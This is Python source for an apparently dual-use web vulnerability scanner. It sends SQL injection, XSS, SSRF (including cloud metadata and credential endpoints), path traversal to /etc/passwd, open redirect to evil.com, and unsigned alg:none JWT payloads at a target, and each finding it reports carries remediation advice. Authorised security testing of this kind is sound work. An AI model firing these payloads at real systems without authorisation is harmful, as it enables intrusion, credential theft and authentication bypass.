"""
╔══════════════════════════════════════════════════════════════════╗
║       CyberCLI ACTIVE SCAN ENGINE — VAPT Automation Core         ║
║       SQLi · XSS · SSRF · CMDi · Path Traversal · JWT · RCE     ║
╚══════════════════════════════════════════════════════════════════╝

Active scanner orchestrator. Imports individual attack modules
and runs them in parallel. Each module is isolated —
one failure does NOT stop others.
"""

import asyncio
import aiohttp
import logging
import time
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger("cybercli.active")

# ─── Safe import of attack modules ──────────────────────────────────────────

def _safe_import(module_path: str, class_name: str):
    try:
        import importlib
        m = importlib.import_module(module_path)
        return getattr(m, class_name)
    except Exception as e:
        logger.debug(f"[ACTIVE] Module load skip: {module_path} — {e}")
        return None


@dataclass
class ScanTarget:
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    params: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)


@dataclass 
class ScanFinding:
    title: str
    severity: str          # Critical / High / Medium / Low / Informational
    confidence: str        # High / Medium / Low
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    cve: str = ""
    scanner: str = "active"
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())

    def to_dict(self) -> dict:
        return {
            "title": self.title,
            "severity": self.severity,
            "confidence": self.confidence,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence[:300],
            "description": self.description,
            "remediation": self.remediation,
            "cvss_score": self.cvss_score,
            "cve": self.cve,
            "scanner": self.scanner,
            "timestamp": self.timestamp,
        }


class ActiveScanner:
    """
    Main active scanning engine.
    Orchestrates all attack modules in parallel.
    Each module runs in isolation — one crash won't kill others.
    AI validation layer reduces false positives post-scan.
    """

    def __init__(
        self,
        target: str,
        threads: int = 10,
        timeout: int = 15,
        on_finding: Optional[Callable] = None,
        modules_enabled: Optional[List[str]] = None,
    ):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.on_finding = on_finding
        self.findings: List[ScanFinding] = []
        self._session: Optional[aiohttp.ClientSession] = None

        # Default: all modules enabled
        self.modules_enabled = modules_enabled or [
            "sqli", "xss", "ssrf", "cmdi", "path_traversal",
            "jwt_attack", "cors", "csrf", "idor", "lfi", "rce",
            "open_redirect", "header_injection", "xml_attack",
            "cache_poison", "request_smuggling", "graphql"
        ]

    async def run(self, targets: List[ScanTarget]) -> List[ScanFinding]:
        """Run all enabled modules against discovered targets"""
        logger.info(f"[ACTIVE] Starting scan: {len(targets)} targets, {len(self.modules_enabled)} modules")

        connector = aiohttp.TCPConnector(limit=self.threads, ssl=False)
        timeout = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            self._session = session
            tasks = []
            for t in targets:
                for module in self.modules_enabled:
                    tasks.append(self._run_module(module, t, session))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, list):
                    for finding in r:
                        self._add_finding(finding)

        return self.findings

    async def _run_module(
        self,
        module_name: str,
        target: ScanTarget,
        session: aiohttp.ClientSession
    ) -> List[ScanFinding]:
        """Run one attack module safely"""
        try:
            mod = ATTACK_MODULES.get(module_name)
            if not mod:
                return []
            scanner = mod(session=session, timeout=self.timeout)
            return await scanner.scan(target)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.debug(f"[ACTIVE] Module {module_name} error: {e}")
            return []

    def _add_finding(self, finding: ScanFinding):
        self.findings.append(finding)
        if self.on_finding:
            try:
                self.on_finding(finding)
            except Exception:
                pass


# ─── Base class all attack modules inherit from ──────────────────────────────

class BaseAttackModule:
    def __init__(self, session: aiohttp.ClientSession, timeout: int = 15):
        self.session = session
        self.timeout = aiohttp.ClientTimeout(total=timeout)

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        raise NotImplementedError

    async def request(self, method: str, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        try:
            resp = await self.session.request(
                method, url,
                timeout=self.timeout,
                ssl=False,
                allow_redirects=False,
                **kwargs
            )
            return resp
        except Exception:
            return None

    async def get_body(self, resp) -> str:
        try:
            return await resp.text(errors="ignore")
        except Exception:
            return ""

    def finding(self, **kwargs) -> ScanFinding:
        return ScanFinding(**kwargs)


# ─── SQLi Module ─────────────────────────────────────────────────────────────

class SQLiScanner(BaseAttackModule):
    """SQL Injection — Error-based, Boolean-based, Time-based"""

    PAYLOADS = {
        "error_based": [
            "'", "\"", "';--", "' OR '1'='1", "' OR 1=1--",
            "1' AND '1'='1", "1 AND 1=1", "') OR ('1'='1",
            "1' OR SLEEP(0)--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:3'--",  # MSSQL
            "' AND SLEEP(3)--",              # MySQL
            "'; SELECT pg_sleep(3)--",       # PostgreSQL
            "' OR SLEEP(3)--",
        ]
    }

    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"ORA-\d{5}", r"Oracle.*error", r"PostgreSQL.*ERROR",
        r"Microsoft OLE DB.*SQL Server", r"Unclosed quotation mark",
        r"SQLSTATE\[", r"sqlite_.*error", r"SQLiteException",
        r"DB2 SQL error", r"System.Data.SqlClient",
        r"Syntax error.*in query expression",
    ]

    import re as _re
    _error_re = [_re.compile(p, _re.IGNORECASE) for p in ERROR_PATTERNS]

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        findings = []
        test_params = list(target.params.keys()) or ["id", "q", "search", "user"]

        for param in test_params:
            for payload_type, payloads in self.PAYLOADS.items():
                for payload in payloads[:5]:  # Limit per param
                    finding = await self._test_param(target, param, payload, payload_type)
                    if finding:
                        findings.append(finding)
                        break  # One confirmed per param is enough

        return findings

    async def _test_param(
        self, target: ScanTarget, param: str, payload: str, payload_type: str
    ) -> Optional[ScanFinding]:
        try:
            test_params = dict(target.params)
            original = test_params.get(param, "1")
            test_params[param] = original + payload

            t_start = time.time()
            resp = await self.request(
                target.method, target.url,
                params=test_params if target.method == "GET" else None,
                data=test_params if target.method == "POST" else None,
                headers=target.headers,
            )
            elapsed = time.time() - t_start

            if not resp:
                return None

            body = await self.get_body(resp)

            # Time-based detection
            if payload_type == "time_based" and elapsed >= 2.5:
                return self.finding(
                    title="SQL Injection (Time-Based Blind)",
                    severity="High",
                    confidence="Medium",
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Response delayed {elapsed:.2f}s with payload",
                    description="Time-based blind SQL injection detected. "
                                "The database delayed response when injected with sleep/waitfor.",
                    remediation="Use parameterized queries / prepared statements. "
                                "Never concatenate user input into SQL.",
                    cvss_score=8.8,
                )

            # Error-based detection
            for pattern in self._error_re:
                m = pattern.search(body)
                if m:
                    return self.finding(
                        title="SQL Injection (Error-Based)",
                        severity="High",
                        confidence="High",
                        url=target.url,
                        parameter=param,
                        payload=payload,
                        evidence=m.group()[:150],
                        description="Error-based SQL injection confirmed. Database error message visible.",
                        remediation="Use parameterized queries. Disable verbose SQL errors in production.",
                        cvss_score=9.1,
                    )

        except Exception as e:
            logger.debug(f"[SQLi] Error: {e}")

        return None


# ─── XSS Module ──────────────────────────────────────────────────────────────

class XSSScanner(BaseAttackModule):
    """Reflected XSS, DOM XSS indicators"""

    PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "\"><img src=1 onerror=alert(document.domain)>",
    ]

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        findings = []
        test_params = list(target.params.keys()) or ["q", "search", "name", "msg"]

        for param in test_params:
            for payload in self.PAYLOADS[:6]:
                f = await self._test_reflected(target, param, payload)
                if f:
                    findings.append(f)
                    break

        return findings

    async def _test_reflected(self, target, param, payload):
        try:
            test_params = dict(target.params)
            test_params[param] = payload

            resp = await self.request(target.method, target.url, params=test_params, headers=target.headers)
            if not resp:
                return None

            body = await self.get_body(resp)
            content_type = resp.headers.get("Content-Type", "")

            if "text/html" not in content_type:
                return None

            # Check payload reflected unencoded
            if payload in body or payload.lower() in body.lower():
                # Verify it's not HTML-encoded
                import html
                encoded = html.escape(payload)
                if encoded not in body:
                    return self.finding(
                        title="Reflected Cross-Site Scripting (XSS)",
                        severity="High",
                        confidence="High",
                        url=target.url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Payload reflected unencoded in response body",
                        description="User-supplied input is reflected in the HTML response without encoding. "
                                    "Attackers can inject malicious scripts.",
                        remediation="HTML-encode all user input before rendering. "
                                    "Implement a strict Content-Security-Policy.",
                        cvss_score=7.4,
                    )
        except Exception as e:
            logger.debug(f"[XSS] Error: {e}")
        return None


# ─── SSRF Module ─────────────────────────────────────────────────────────────

class SSRFScanner(BaseAttackModule):
    """Server-Side Request Forgery"""

    PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",          # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "http://169.254.169.254/metadata/v1/",                # Azure
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "ftp://localhost:21/",
    ]

    AWS_INDICATORS = ["ami-id", "instance-id", "instance-type", "security-credentials"]

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        findings = []
        url_params = [p for p, v in target.params.items()
                      if any(k in p.lower() for k in ["url", "uri", "path", "host", "dest", "redirect", "return", "next", "link", "src", "source", "ref"])]

        for param in url_params:
            for payload in self.PAYLOADS[:5]:
                f = await self._test(target, param, payload)
                if f:
                    findings.append(f)
                    break

        return findings

    async def _test(self, target, param, payload):
        try:
            test_params = dict(target.params)
            test_params[param] = payload

            resp = await self.request(target.method, target.url, params=test_params, headers=target.headers)
            if not resp:
                return None

            body = await self.get_body(resp)

            # Check for AWS/cloud metadata response
            for indicator in self.AWS_INDICATORS:
                if indicator in body:
                    return self.finding(
                        title="Server-Side Request Forgery (SSRF) — Cloud Metadata",
                        severity="Critical",
                        confidence="High",
                        url=target.url,
                        parameter=param,
                        payload=payload,
                        evidence=body[:200],
                        description="SSRF confirmed: cloud metadata endpoint accessible. "
                                    "Attacker can steal IAM credentials and pivot to cloud infrastructure.",
                        remediation="Validate and whitelist allowed URLs. Block metadata IP ranges. "
                                    "Use IMDSv2 (AWS). Implement egress firewall rules.",
                        cvss_score=9.8,
                        cve="CWE-918"
                    )

            # Generic: did we get a successful response to an internal URL?
            if payload.startswith("http://127") or payload.startswith("http://localhost"):
                if resp.status == 200 and len(body) > 50:
                    return self.finding(
                        title="Potential SSRF — Internal Service Accessible",
                        severity="High",
                        confidence="Medium",
                        url=target.url,
                        parameter=param,
                        payload=payload,
                        evidence=f"HTTP 200 with {len(body)} bytes returned for internal URL",
                        description="The server made a request to an internal/loopback address and returned content.",
                        remediation="Validate all user-supplied URLs. Use an allowlist of permitted hosts.",
                        cvss_score=8.6,
                    )
        except Exception as e:
            logger.debug(f"[SSRF] Error: {e}")
        return None


# ─── Path Traversal Module ───────────────────────────────────────────────────

class PathTraversalScanner(BaseAttackModule):
    """Directory / Path Traversal"""

    PAYLOADS = [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../../windows/win.ini",
        "../../../boot.ini",
    ]

    UNIX_INDICATORS = ["root:x:0:0", "daemon:", "nobody:", "/bin/bash", "/bin/sh"]
    WIN_INDICATORS = ["[boot loader]", "[extensions]", "MSDOS.SYS"]

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        findings = []
        file_params = [p for p, v in target.params.items()
                       if any(k in p.lower() for k in ["file", "path", "page", "template", "include", "doc", "read", "load", "dir"])]

        for param in file_params or list(target.params.keys())[:3]:
            for payload in self.PAYLOADS:
                f = await self._test(target, param, payload)
                if f:
                    findings.append(f)
                    break

        return findings

    async def _test(self, target, param, payload):
        try:
            test_params = dict(target.params)
            test_params[param] = payload

            resp = await self.request(target.method, target.url, params=test_params, headers=target.headers)
            if not resp:
                return None
            body = await self.get_body(resp)

            for ind in self.UNIX_INDICATORS + self.WIN_INDICATORS:
                if ind in body:
                    return self.finding(
                        title="Path Traversal / Local File Inclusion",
                        severity="High",
                        confidence="High",
                        url=target.url,
                        parameter=param,
                        payload=payload,
                        evidence=body[:200],
                        description="Path traversal confirmed. Sensitive system files readable.",
                        remediation="Use a whitelist of allowed files. Canonicalize paths before reading. "
                                    "Jail the application to its directory.",
                        cvss_score=8.2,
                    )
        except Exception as e:
            logger.debug(f"[PathTraversal] Error: {e}")
        return None


# ─── Open Redirect Module ────────────────────────────────────────────────────

class OpenRedirectScanner(BaseAttackModule):
    PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "https:///evil.com",
        "/\\evil.com",
        "https://evil.com%2F@legitimate.com",
    ]

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        findings = []
        redirect_params = [p for p, v in target.params.items()
                           if any(k in p.lower() for k in ["redirect", "return", "next", "url", "goto", "dest"])]

        for param in redirect_params:
            for payload in self.PAYLOADS:
                f = await self._test(target, param, payload)
                if f:
                    findings.append(f)
                    break
        return findings

    async def _test(self, target, param, payload):
        try:
            test_params = dict(target.params)
            test_params[param] = payload

            resp = await self.request(target.method, target.url, params=test_params, headers=target.headers)
            if not resp:
                return None

            location = resp.headers.get("Location", "")
            if "evil.com" in location:
                return self.finding(
                    title="Open Redirect",
                    severity="Medium",
                    confidence="High",
                    url=target.url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Location: {location}",
                    description="Application redirects to attacker-controlled URL. "
                                "Enables phishing, credential harvesting.",
                    remediation="Use a whitelist of allowed redirect destinations. "
                                "Validate redirect URLs server-side.",
                    cvss_score=6.1,
                )
        except Exception as e:
            logger.debug(f"[OpenRedirect] Error: {e}")
        return None


# ─── JWT Attack Module ────────────────────────────────────────────────────────

class JWTAttackScanner(BaseAttackModule):
    """JWT algorithm confusion, none alg, weak secrets"""

    async def scan(self, target: ScanTarget) -> List[ScanFinding]:
        findings = []
        auth = target.headers.get("Authorization", "")
        if not auth.lower().startswith("bearer "):
            return []

        token = auth[7:]
        findings += await self._test_none_alg(target, token)
        findings += await self._test_alg_confusion(target, token)
        return findings

    async def _test_none_alg(self, target, token) -> List[ScanFinding]:
        import base64, json
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return []

            header = json.loads(base64.b64decode(parts[0] + "=="))
            header["alg"] = "none"
            new_header = base64.b64encode(
                json.dumps(header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            tampered = f"{new_header}.{parts[1]}."

            headers = dict(target.headers)
            headers["Authorization"] = f"Bearer {tampered}"

            resp = await self.request(target.method, target.url, headers=headers)
            if resp and resp.status in (200, 201, 202, 204):
                return [self.finding(
                    title="JWT None Algorithm Attack",
                    severity="Critical",
                    confidence="High",
                    url=target.url,
                    payload="alg: none",
                    evidence=f"Tampered JWT accepted: HTTP {resp.status}",
                    description="Server accepts JWT with alg:none — signature verification bypassed. "
                                "Complete authentication bypass.",
                    remediation="Explicitly validate the 'alg' header. Reject 'none'. "
                                "Use asymmetric keys (RS256/ES256) for production.",
                    cvss_score=10.0,
                )]
        except Exception as e:
            logger.debug(f"[JWT] None alg error: {e}")
        return []

    async def _test_alg_confusion(self, target, token) -> List[ScanFinding]:
        # RS256 → HS256 algorithm confusion (advanced)
        # Placeholder for full implementation
        return []


# ─── Module Registry ─────────────────────────────────────────────────────────

ATTACK_MODULES: Dict[str, type] = {
    "sqli": SQLiScanner,
    "xss": XSSScanner,
    "ssrf": SSRFScanner,
    "path_traversal": PathTraversalScanner,
    "open_redirect": OpenRedirectScanner,
    "jwt_attack": JWTAttackScanner,
    # Additional modules loaded dynamically
}
